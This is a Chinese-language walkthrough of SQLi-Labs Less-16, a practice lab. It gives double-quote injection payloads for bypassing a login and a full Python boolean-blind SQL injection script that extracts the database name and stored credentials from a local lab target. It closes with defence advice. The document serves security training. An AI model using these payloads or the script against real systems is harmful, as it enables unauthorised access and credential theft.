## 一、题目信息
- 平台：SQLi-Labs
- 分类：Web - SQL Injection
- 难度：困难
- 通关标识：在 POST 登录框无回显、无报错的情况下，识别出双引号闭合，利用 Python 编写布尔盲注脚本猜解出数据。

## 二、大白话原理讲解
这关和第 15 关是双胞胎。柜员（数据库）依然是那个不说话的“哑巴”，不给你看数据，也不给你报错。你只能靠问“是非题”（是或否）来套取信息。

**唯一的区别是：锁孔换了。**
第 15 关的锁孔是单引号（`'`），这关的锁孔变成了**双引号（`"`）**（可能还带个括号）。
只要你把上一关 Python 脚本里的单引号换成双引号，那把万能钥匙（脚本）就又能捅开这扇门了。

## 三、解题步骤

**1. 抓包与测闭合**
用 HackBar 或 Burp 抓取登录请求。
*   尝试 `uname=admin"`，页面虽然不报错，但登录失败。
*   尝试万能密码：`uname=admin" or 1=1 #`，页面显示 `SUCCESSFULLY LOGGED IN`。
（如果有括号，则尝试 `admin") or 1=1 #`）。
确认闭合符为双引号 `"`。

**2. 修改 Python 盲注脚本**
直接将 Less-15 的脚本复制过来，做两处修改：
1. 修改 URL 指向 Less-16。
2. 将 `uname` 字典中的单引号 `'` 替换为双引号 `"`。

```python
import requests

url = "http://127.0.0.1/sqli-labs-master/Less-16/"
success_mark = "flag.jpg"  # 依然是靠成功页面加载的特征图片判断

def is_true(cond):
    # ⚠️ 核心修改：这里把单引号换成了双引号
    data = {
        "uname": f'admin" AND ({cond}) #',
        "passwd": "123456",
        "submit": "Submit",
    }
    try:
        response = requests.post(url, data=data, timeout=5)
        return success_mark in response.text
    except:
        return False

def bisect(expr, low, high):
    while low <= high:
        mid = (low + high) // 2
        if is_true(f"{expr}>{mid}"):
            low = mid + 1
        else:
            high = mid - 1
    return low

def extract(sql):
    n = bisect(f"length(({sql}))", 0, 64)
    result = ""
    print(f"[*] 长度: {n}，开始猜解...")
    for i in range(1, n + 1):
        ascii_code = bisect(f"ascii(substr(({sql}),{i},1))", 32, 126)
        result += chr(ascii_code)
        print(f"[+] 当前结果: {result}")
    return result

if __name__ == "__main__":
    print("[*] 开始爆破...")
    # 查库名
    db_name = extract("select database()")
    print(f"\n[🎉] 数据库名: {db_name}")
    
    # 查第一行账号密码
    user_data = extract("select concat(username,0x3a,password) from users limit 0,1")
    print(f"\n[🎉] 账号密码: {user_data}")
```

**3. 运行结果**
终端会类似于第 15 关，疯狂刷出字符，最终跑出 `security` 和 `Dumb:Dumb`。

## 四、知识点解析
1. **举一反三**：盲注的核心逻辑（二分法、布尔判断）是不变的。无论闭合符换成单引号、双引号还是括号，只需调整 Payload 的头尾即可。
2. **双引号注入**：在 POST 请求中，后台代码可能是 `username="$uname"`，直接输入双引号即可闭合，若不行再尝试 `")`。

## 五、总结与防御
**本题总结**：
Less-16 就是 Less-15 的双引号版。只要找准闭合方式，通过判断页面加载的不同图片（`flag.jpg` 或 `slap.jpg`）作为布尔真假特征，自动化脚本就能完美运行。

**安全防御建议**：
- **统一错误响应**：彻底杜绝页面特征差异。
- **预编译语句（PDO/MySQLi）**：根本解决注入隐患。
